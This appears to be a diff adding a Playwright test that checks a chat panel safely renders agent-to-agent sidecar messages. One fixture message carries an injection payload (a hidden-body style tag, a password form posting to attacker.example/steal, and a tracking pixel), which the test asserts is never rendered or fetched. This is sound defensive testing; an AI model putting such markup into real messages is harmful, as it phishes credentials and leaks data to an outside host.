@@ -469,6 +469,48 @@ test.describe('Tab switching', () => {
 
 })
 
+test('Room Sidecar A2A is visible and passively rendered in the canonical Leader chat', async ({ page }) => {
+  const a2a = [
+    { seq: 1, ts: Date.parse('2026-08-30T12:00:00Z'), from: 'leader', to: 'caretaker', text: 'Check the Wiki decision.' },
+    { seq: 3, ts: Date.parse('2026-08-30T12:00:02Z'), from: 'caretaker', to: 'leader', text: '<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)' },
+    { seq: 2, ts: Date.parse('2026-08-30T12:00:01Z'), from: 'caretaker', to: 'leader', text: 'Decision is current.' },
+  ]
+  let remoteMediaRequests = 0
+  await page.route('https://attacker.example/**', async route => {
+    remoteMediaRequests++
+    await route.abort()
+  })
+  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route =>
+    route.fulfill({ json: { room: 'feather' } }))
+  await page.route('**/api/sidecar/room-feather/stream', route =>
+    route.fulfill({
+      status: 200,
+      contentType: 'text/event-stream',
+      body: `event: connected\\ndata: {}\\n\\n${a2a.map((message) => `event: message\\ndata: ${JSON.stringify(message)}\\n\\n`).join('')}`,
+    }))
+  await page.route('**/api/sidecar/room-feather', route =>
+    route.fulfill({ json: {
+      group: {
+        id: 'room-feather', kind: 'room', roomName: 'feather', status: 'active',
+        members: [
+          { sessionId: TEST_SESSION_ID, role: 'leader', spawned: false },
+          { sessionId: 'caretaker-session', role: 'caretaker', spawned: false },
+        ],
+      },
+      thread: a2a,
+    } }))
+
+  await page.goto(BASE)
+  await page.waitForLoadState('networkidle')
+  await selectTestSession(page)
+  await expect(page.getByText(/Leader.*Caretaker/).filter({ hasText: 'Leader' })).toBeVisible()
+  await expect(page.getByText('Check the Wiki decision.')).toBeVisible()
+  await expect(page.getByText('Decision is current.')).toBeVisible()
+  await expect(page.getByText(/\[feather-sidecar room-feather/)).toHaveCount(0)
+  await expect(page.getByTestId('chat-panel').locator('form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
+  expect(remoteMediaRequests).toBe(0)
+})
+
 // ── Live SSE updates in the browser ─────────────────────────────────────────
 
 test.describe('Live updates', () => {
